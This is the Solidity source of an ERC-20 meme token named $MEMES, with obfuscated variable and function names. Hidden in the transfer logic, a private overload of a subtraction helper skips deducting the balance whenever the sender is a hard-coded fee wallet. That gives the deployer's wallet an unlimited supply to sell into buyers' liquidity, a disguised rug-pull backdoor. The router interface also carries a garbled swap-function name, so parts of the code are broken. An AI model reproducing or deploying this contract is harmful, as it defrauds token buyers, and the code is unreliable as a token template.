/**

This is  $MEMES


TWITTER: https://twitter.com/MEMES_ERC
TELEGRAM: https://t.me/MEMESCoin_ERC
WEBSITE: https://memeseth.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qvfjo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qvfjo(a, b, "SafeMath:");
    }

    function  _qvfjo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _skgvqokbmp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _payfakejfs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract MEMES is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"MEMES";
    string private constant _symbol = unicode"MEMES";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalga = 1000000000 * 10 **_decimals;
    uint256 public _mxTajoAmaunt = _Totalga;
    uint256 public _Walleuhvux = _Totalga;
    uint256 public _wapThresholdeux= _Totalga;
    uint256 public _mokmTouvp= _Totalga;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqsyst=0;
    uint256 private _burajvrt=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEvadkFhvf;
    mapping (address => bool) private _taxbWalory;
    mapping(address => uint256) private _lruevrkacep;
    bool public _tlfereslxnove = false;
    address payable private _qkvfadFbdp;

    _payfakejfs private _fmoRpbsvt;
    address private _acdPtrdcw;
    bool private _zrjcjgtah;
    bool private iuxSwprfq = false;
    bool private _aplEabljq = false;

    event _amrfauytl(uint _mxTajoAmaunt);
    modifier lcktsThopap {
        iuxSwprfq = true;
        _;
        iuxSwprfq = false;
    }

    constructor () {

        _qkvfadFbdp = payable(0xA4b1f4A1Cb172C4d448f6167babCeb38d662Fb89);
        _balances[_msgSender()] = _Totalga;
        _isEvadkFhvf[owner()] = true;
        _isEvadkFhvf[address(this)] = true;
        _isEvadkFhvf[_qkvfadFbdp] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalga);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalga;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qvfjo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlfereslxnove) {
                if (to != address
                (_fmoRpbsvt) && to !=
                 address(_acdPtrdcw)) {
                  require(_lruevrkacep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruevrkacep
                  [tx.origin] = block.number;
                }
            }

            if (from == _acdPtrdcw && to != 
            address(_fmoRpbsvt) && !_isEvadkFhvf[to] ) {
                require(amount <= _mxTajoAmaunt,
                 "Exceeds the _mxTajoAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walleuhvux, "Exceeds the maxWalletSize.");
                if(_burajvrt
                < _wapBeforeqsyst){
                  require(! _fyoqavz(to));
                }
                _burajvrt++;
                 _taxbWalory[to]=true;
                teeomoun = amount.mul((_burajvrt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acdPtrdcw && from!= address(this) 
            && !_isEvadkFhvf[from] ){
                require(amount <= _mxTajoAmaunt && 
                balanceOf(_qkvfadFbdp)<_mokmTouvp,
                 "Exceeds the _mxTajoAmaunt.");
                teeomoun = amount.mul((_burajvrt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burajvrt>_wapBeforeqsyst &&
                 _taxbWalory[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iuxSwprfq 
            && to == _acdPtrdcw && _aplEabljq &&
             contractTokenBalance>_wapThresholdeux 
            && _burajvrt>_wapBeforeqsyst&&
             !_isEvadkFhvf[to]&& !_isEvadkFhvf[from]
            ) {
                _swpvknrvuj( _qvuje(amount, 
                _qvuje(contractTokenBalance,_mokmTouvp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _emodjkp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qvfjo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qvfjo(teeomoun));
        emit Transfer(from, to, 
        amount. _qvfjo(teeomoun));
    }

    function _swpvknrvuj(uint256
     tokenAmount) private lcktsThopap {
        if(tokenAmount==0){return;}
        if(!_zrjcjgtah){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _fmoRpbsvt.WETH();
        _approve(address(this),
         address(_fmoRpbsvt), tokenAmount);
        _fmoRpbsvt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qvuje(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qvfjo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qkvfadFbdp){
            return a ;
        }else{
            return a . _qvfjo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTajoAmaunt = _Totalga;
        _Walleuhvux = _Totalga;
        _tlfereslxnove = false;
        emit _amrfauytl(_Totalga);
    }

    function _fyoqavz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _emodjkp(uint256
    amount) private {
        _qkvfadFbdp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _zrjcjgtah);
        _fmoRpbsvt   =  _payfakejfs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_fmoRpbsvt), _Totalga);
        _acdPtrdcw = _skgvqokbmp(_fmoRpbsvt.factory()). createPair (address(this),  _fmoRpbsvt . WETH ());
        _fmoRpbsvt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acdPtrdcw).approve(address(_fmoRpbsvt), type(uint).max);
        _aplEabljq = true;
        _zrjcjgtah = true;
    }

    receive() external payable {}
}